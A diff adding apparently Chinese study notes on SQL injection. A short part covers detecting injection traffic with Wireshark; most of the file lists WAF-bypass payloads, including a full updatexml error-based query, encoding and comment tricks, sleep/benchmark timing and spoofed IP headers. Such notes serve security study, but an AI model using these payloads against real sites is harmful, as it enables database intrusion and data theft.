@@ -1,0 +1,96 @@
+分析目标防火墙规则并跳过
+1.封IP  2.消掉关键字，但凡侦测到，直接替换为空 aandnd,  大小写是否敏感
+突破防火墙
+
+你有那些SQL 查询异常流量分析的思路？
+1、数据库短时间内查询增多有可能遭遇到了【扫描】或者【sql 注入测试】，可以结合流量分析工具进行研判
+2、【select】 和【union】为数据库查询语句特征，当这两者数量出现次数较多而且差异较小可能存在 SOL 注入漏洞或正在被扫描器扫描，可监控这两个关键字，但还需 要进一步查看具体请求参数。
+如：                       
+（1) 使用 wireshark 打开抓取后的流量包                        
+（2) 对于抓取到的数据包筛选出 HTTP 协议包，在统计处筛选出短时间内流量较大的 IP
+（3）尝试定位一些基本的注入特征（select、union、（）、/*、sleep 等）
+
+常用报错函数
+
+
+绕 WAF 的多种方式
+* 字母大小写混合绕过
+原因：服务器端检测时未开启大小写不敏感
+形式：UnIon SeLecT
+
+* 多重关键字（重写）
+原因：服务器端检测到敏感字符时替换为空
+形式：ununionion selselectect
+
+* 注释与内联字符
+原因：服务器端未检测或检测不严注释内的字符串
+形式：/**/，/*!*/，/*!12345*/，#，-- - 等
+/*!50001 select * from users */
+这里的50001=如果数据库版本是5.00.01以上的版本，这个语句才会被执行
+
+* 编码绕过--未测试
+原因：服务器端未检测或检测不严具有编码形式的关键字
+类型：十六进制编码、URL 编码、Unicode 编码、ascii 编码绕过
+形式：0x61646d696e、%20、%u0020、Test =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)
+
+* 等价函数或命令
+原因：服务器端黑名单不完整，过滤不严
+形式：
+Mysql 查询：
+Union distinct、updatexml、Extractvalue、floor
+字符串截取函数：
+mid、substr、substring、left、reverse
+字符串连接函数：
+concat、group_concat、concat_ws、select group_ws('','x','y')
+字符串转换：
+char、hex、unhex
+替换逗号：
+select substr('security',1,3)---select substr('security' from 1 for 3)
+union select 1,2,3---union select * from (select 1)a join (select 2)b join (select 3)c
+limit 0,1---limit 0 offset 1
+替换等号：
+like、rlike、 regexp 、<>
+id =1' or '1' like '1
+替换注释：
+and '1'='1 、 || 、&&、-- -
+
+* 组合绕过
+原因：服务器端检测多处位置，需要多重绕过方式组合使用
+形式：id = 1’ and/**/’1’like’2’/**//*!12345union*/select 1,2,3
+
+
+* 特殊字符
+原因：数据库中效果相同，服务器端却没有限制
+形式：
+科学记数法 and 1e0 = 1e0
+空白字符 %0a %a0 %0b %20 %09，可以用（）分隔，确保语句正确，括号 select * from (test.admin)
+<>绕过:uni<>on
+
+代替空格的东西
+%09 水平tab键
+%0a 新建一行
+%0c  新建一页
+%0d  回车键
+%0b  垂直tab键
+%a0  也可以是空格键（大多数情况用）
+不用空格进行注入：
+id=1%27||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))||1=%27
+
+*ip地址拦截
+放在burp的数据包中的
+x-forward-for
+x-remote-ip
+x-originating-ip
+x-remote-addr
+x-real-ip
+
+*sleep屏蔽
+and sleep(1)
+and benchmark(100000000,1)
+
+*修改资源
+http://www.xx.com/sql.php?id=1
+http://www.xx.com/sql.php/1.js?id=1
+
+
+
